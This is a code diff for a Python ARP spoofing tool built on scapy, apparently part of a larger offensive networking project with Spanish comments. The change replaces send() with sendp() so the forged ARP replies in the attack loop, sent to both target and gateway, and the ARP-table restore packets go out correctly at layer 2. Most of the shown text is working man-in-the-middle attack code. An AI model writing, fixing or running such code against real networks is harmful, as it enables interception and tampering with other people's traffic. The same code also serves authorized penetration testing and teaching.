@@ -1,6 +1,6 @@
 from dataclasses import dataclass
 from scapy.layers.l2 import ARP, Ether, getmacbyip as get_mac_address
-from scapy.all import send
+from scapy.all import sendp
 from ..utils.logging_utils import setup_logger
 from ..utils.network_utils import enable_ip_forwarding
 import time
@@ -50,7 +50,7 @@ class ARPSpoofAttack:
 
         if target_mac and gateway_mac:
             # Restaurar ARP tabla del objetivo
-            send(Ether(dst=target_mac) / ARP(
+            sendp(Ether(dst=target_mac) / ARP(
                 op=2,
                 pdst=self.config.target_ip,
                 hwdst=target_mac,
@@ -59,7 +59,7 @@ class ARPSpoofAttack:
             ), count=5, verbose=False)
 
             # Restaurar ARP tabla del gateway
-            send(Ether(dst=gateway_mac) / ARP(
+            sendp(Ether(dst=gateway_mac) / ARP(
                 op=2,
                 pdst=self.config.gateway_ip,
                 hwdst=gateway_mac,
@@ -79,13 +79,13 @@ class ARPSpoofAttack:
 
         while self.running:
             # Enviar paquetes ARP maliciosos encapsulados en una trama Ethernet
-            send(self.craft_arp_packet(
+            sendp(self.craft_arp_packet(
                 self.config.target_ip,
                 self.config.gateway_ip,
                 target_mac
             ), verbose=False)
 
-            send(self.craft_arp_packet(
+            sendp(self.craft_arp_packet(
                 self.config.gateway_ip,
                 self.config.target_ip,
                 gateway_mac
